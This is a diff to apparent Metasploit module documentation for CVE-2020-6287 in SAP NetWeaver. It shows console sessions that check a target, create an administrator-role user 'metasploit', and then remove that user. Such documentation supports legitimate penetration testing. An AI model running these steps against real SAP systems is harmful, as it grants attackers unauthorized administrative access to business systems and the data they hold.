@@ -37,7 +37,7 @@ From the documentation:
 
 ### SAP NetWeaver 7.50
 
-For example, adding a new user `metasploit` with the `Administrator` role:
+Example: Adding a new user `metasploit` with the `Administrator` role:
 
 ```
 msf5 > use auxiliary/admin/sap/cve_2020_6287_ws_add_user 
@@ -47,17 +47,41 @@ msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set USERNAME metasploit
 USERNAME => metasploit
 msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set PASSWORD 0pe3nS3sam3
 PASSWORD => 0pe3nS3sam3
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > check
+[+] 192.168.53.183:50000 - The target is vulnerable.
 msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set VERBOSE true
 VERBOSE => true
 msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > run
 [*] Running module against 192.168.53.183
 
 [*] Starting the PCK Upgrade job...
-[+] Job running with session id: 2c139ded-287f-4c21-a5ef-4c379abcbe22
+[+] Job running with session id: 3e76e705-4bbd-4a6b-b243-154768287fb0
 [*] Received event description: Execution of User Management
 [*] Received event description: Create User PCKUser
+[+] Successfully created the user account
 [*] Received event description: Assign Role SAP_XI_PCK_CONFIG to PCKUser
+[+] Successfully added the role to the new user
 [*] Canceling the PCK Upgrade job...
+[*] Auxiliary module execution completed
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) >
+```
+
+Example: Removing the user `metasploit`:
+
+```
+msf5 > use auxiliary/admin/sap/cve_2020_6287_ws_add_user 
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set RHOSTS netweaver.lan
+RHOSTS => netweaver.lan
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set USERNAME metasploit
+USERNAME => metasploit
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set PASSWORD 0pe3nS3sam3
+PASSWORD => 0pe3nS3sam3
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > set ACTION REMOVE
+ACTION => REMOVE
+msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) > run
+[*] Running module against 192.168.53.183
+
+[+] Successfully deleted the user account
 [*] Auxiliary module execution completed
 msf5 auxiliary(admin/sap/cve_2020_6287_ws_add_user) >
 ```
